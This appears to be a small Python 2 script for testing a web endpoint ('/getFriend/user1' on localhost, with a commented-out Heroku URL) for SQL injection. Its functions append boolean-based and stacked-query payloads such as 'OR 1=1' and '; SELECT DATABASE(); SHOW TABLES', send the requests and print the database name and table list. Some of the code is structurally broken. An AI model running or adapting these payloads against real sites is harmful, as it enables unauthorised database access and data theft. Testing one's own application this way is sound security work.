import urllib2
import httplib
import json as js

class ex1(object):

   def check_boolean_based_attack( str ):
      print "This web server is vulnerable for Boolean-based attack."
      return str + "'%20OR%20'1'='1'%20--%20"

   def is_request_successful(code):
      return code == 200

   def check_stack_query ( str ):
      req = str + "'%3B%20SELECT%20DATABASE()%3B%20--%20"
      opener = urllib2.build_opener()
      f = opener.open(req)
      database = js.loads(f.read())
      print "This web server is vulnerable for Stacked Queries(Piggy Backing)."
      print "The Database's name is: "
      print database[1][0]['DATABASE()'] + "\n"

      req = str + "'%3B%20SHOW%20TABLES%3B%20--%20"
      f = opener.open(req)
      tables = js.loads(f.read())
      print "The tables in this database are: "
      for table in tables[1]:
         print table.values()[0]

   def check_if_database_error_exposed ( str ):
      newStr = str + "%3B%20Select%20*%20from%20aasdafasflkdsajfdsauoiewanklrjfjdalskjf%20"
      print(newStr)
      contents = urllib2.urlopen(newStr)
      print(contents.read())
      print(contents.getcode())



   # origin = "https://lit-garden-23003.herokuapp.com/getFriend/user1"
   origin = "http://localhost:3000/getFriend/user1"
   #

   check_stack_query(origin)



   # print json[0]['title']
   # # a = booleanattack("https://lit-garden-23003.herokuapp.com/getFriend/user1")
   # # print(a)
   #
   # check_if_database_error_exposed(origin)

   # contents = urllib2.urlopen(a)
   # print(contents.read())
   # print contents.getcode()

   # b = check_multiple_query(origin)
   # print(b)
   # contents2 = urllib2.urlopen(b)
   # print(contents2.read())
   # print contents2.getcode()
   # check_multiple_query(origin)
#
# localhost:3000/getFriend/user1'; SELECT DATABASE(); --%20
# localhost:3000/getFriend/user1'; SHOW TABLES; --%20